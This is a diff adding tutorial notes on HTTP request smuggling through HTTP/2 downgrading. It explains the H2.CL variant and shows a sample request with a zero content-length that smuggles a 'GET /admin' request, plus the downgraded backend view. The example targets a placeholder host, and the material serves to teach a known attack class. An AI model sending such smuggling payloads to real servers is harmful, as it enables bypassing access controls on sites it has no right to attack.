@@ -555,6 +555,59 @@ An important caveat here is that the attacker doesn't know the URL against which
 
 ## HTTP/2
 
+Request smuggling is fundamentally about exploiting discrepancies between how different servers interpret the length of a request. HTTP/2 introduces a single, robust mechanism for doing this, which has long been thought to make it inherently immune to request smuggling.
+
+### HTTP downgrading
+
+![https downgrading](/web/img/http2-downgrading.jpg)
+
+This works because each version of the protocol is fundamentally just a different way of representing the same information. Each item in an HTTP/1 message has an approximate equivalent in HTTP/2.
+
+HTTP/2 downgrading can expose websites to request smuggling attacks, even though HTTP/2 itself is generally considered immune when used end to end.
+
+
+## H2.CL
+
+HTTP/2 requests don't have to specify their length explicitly in a header. During downgrading, this means front-end servers often add an HTTP/1 Content-Length header, deriving its value using HTTP/2's built-in length mechanism.
+
+Interestingly, HTTP/2 requests can also include their own content-length header. In this case, some front-end servers will simply reuse this value in the resulting HTTP/1 request.
+
+The spec dictates that any content-length header in an HTTP/2 request must match the length calculated using the built-in mechanism, but this isn't always validated properly before downgrading. As a result, it may be possible to smuggle requests by injecting a misleading content-length header.
+
+HTTP2 Front-end
+
+header | value
+--- | ---
+:method |	`POST`
+:path |	`/example`
+:authority |	`vulnerable-website.com`
+content-type |	`application/x-www-form-urlencoded`
+content-length |`	0`
+
+body:
+
+```
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 10
+
+x=1
+```
+
+HTTP1 backend
+
+```
+POST /example HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 10
+
+x=1GET / H
+```
 
 ---
 
